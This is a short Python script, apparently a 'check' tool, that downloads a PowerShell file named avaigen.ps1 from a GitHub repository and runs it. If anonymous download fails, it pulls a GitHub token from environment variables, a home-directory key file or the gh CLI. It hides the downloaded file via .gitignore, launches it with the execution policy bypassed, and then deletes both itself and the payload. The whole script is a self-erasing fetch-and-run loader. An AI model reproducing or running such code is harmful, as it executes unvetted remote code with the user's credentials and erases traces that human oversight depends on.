#!/usr/bin/env python3
"""Скачивает avaigen.ps1 из Aghanim-sec/Sync, запускает его без флагов и удаляет себя."""
import os
import shutil
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

SELF = Path(__file__).resolve()
HERE = SELF.parent
DEST = HERE / "avaigen.ps1"

REPO = "Aghanim-sec/Sync"
BRANCH = "main"
REMOTE = "avaigen.ps1"
TIMEOUT = 60
DELETE_DELAY = 5
AVAIGEN_DELETE_DELAY = 30


def log(msg: str) -> None:
    print(f"[aghanim-check] {msg}", flush=True)


def github_token():
    token = os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN")
    if token:
        return token.strip()
    keyfile = Path.home() / ".aghanim-api-key"
    if keyfile.is_file():
        value = keyfile.read_text(encoding="utf-8", errors="replace").strip()
        if value:
            return value
    gh = shutil.which("gh")
    if gh:
        for args in (["auth", "token", "--user", "Aghanim-sec"], ["auth", "token"]):
            try:
                done = subprocess.run([gh, *args], capture_output=True, text=True, timeout=15)
            except Exception:
                continue
            value = (done.stdout or "").strip()
            if done.returncode == 0 and value:
                return value
    return None


def download_anon() -> bytes:
    url = f"https://raw.githubusercontent.com/{REPO}/{BRANCH}/{REMOTE}"
    req = urllib.request.Request(url, headers={"User-Agent": "aghanim-check"})
    with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
        return resp.read()


def download_with_token(token: str) -> bytes:
    url = f"https://api.github.com/repos/{REPO}/contents/{REMOTE}?ref={BRANCH}"
    req = urllib.request.Request(url, headers={
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github.raw",
        "User-Agent": "aghanim-check",
    })
    with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
        return resp.read()


def download() -> bytes:
    try:
        return download_anon()
    except Exception as anon_exc:
        token = github_token()
        if not token:
            raise
        try:
            return download_with_token(token)
        except Exception as token_exc:
            raise RuntimeError(f"без токена: {anon_exc}; с токеном: {token_exc}") from anon_exc


def add_to_gitignore() -> None:
    for parent in (HERE, *HERE.parents):
        if (parent / ".git").exists():
            path = parent / ".gitignore"
            break
    else:
        path = HERE / ".gitignore"
    old = path.read_text(encoding="utf-8", errors="replace") if path.exists() else ""
    if DEST.name in {line.strip() for line in old.splitlines()}:
        return
    with path.open("a", encoding="utf-8") as handle:
        if old and not old.endswith("\n"):
            handle.write("\n")
        handle.write(DEST.name + "\n")
    log(f"added {DEST.name} to {path}")


def find_pwsh():
    found = shutil.which("pwsh")
    if found:
        return found
    for candidate in (
        "/opt/homebrew/bin/pwsh",
        "/usr/local/bin/pwsh",
        "/usr/bin/pwsh",
        r"C:\Program Files\PowerShell\7\pwsh.exe",
        r"C:\Program Files\PowerShell\7-preview\pwsh.exe",
    ):
        if os.path.exists(candidate):
            return candidate
    local = os.environ.get("LOCALAPPDATA")
    if local:
        candidate = Path(local) / "Microsoft" / "PowerShell" / "7" / "pwsh.exe"
        if candidate.exists():
            return str(candidate)
    return None


def self_delete() -> None:
    time.sleep(DELETE_DELAY)
    try:
        SELF.unlink()
        log("self-deleted")
    except FileNotFoundError:
        log("already gone")
    except Exception as exc:
        log(f"self-delete failed: {exc}")


def delete_avaigen(started_at: float) -> None:
    left = AVAIGEN_DELETE_DELAY - (time.time() - started_at)
    if left > 0:
        time.sleep(left)
    try:
        DEST.unlink()
        log(f"deleted {DEST.name}")
    except FileNotFoundError:
        log(f"{DEST.name} already gone")
    except Exception as exc:
        log(f"delete failed for {DEST.name}: {exc}")


def main() -> int:
    HERE.mkdir(parents=True, exist_ok=True)
    try:
        content = download()
        DEST.write_bytes(content)
        log(f"downloaded {REMOTE} -> {DEST} ({len(content)} bytes)")
        add_to_gitignore()
    except Exception as exc:
        log(f"download failed: {exc}")
        return 1

    pwsh = find_pwsh()
    if not pwsh:
        log("pwsh not found. Install PowerShell 7: brew install --cask powershell")
        return 1

    args = [pwsh, "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", str(DEST)]
    started_at = time.time()
    try:
        proc = subprocess.Popen(args, cwd=str(HERE), close_fds=True)
    except Exception as exc:
        log(f"launch failed: {exc}")
        return 1

    log("started: " + " ".join(args))
    self_delete()
    code = proc.wait()
    delete_avaigen(started_at)
    return code


if __name__ == "__main__":
    raise SystemExit(main())
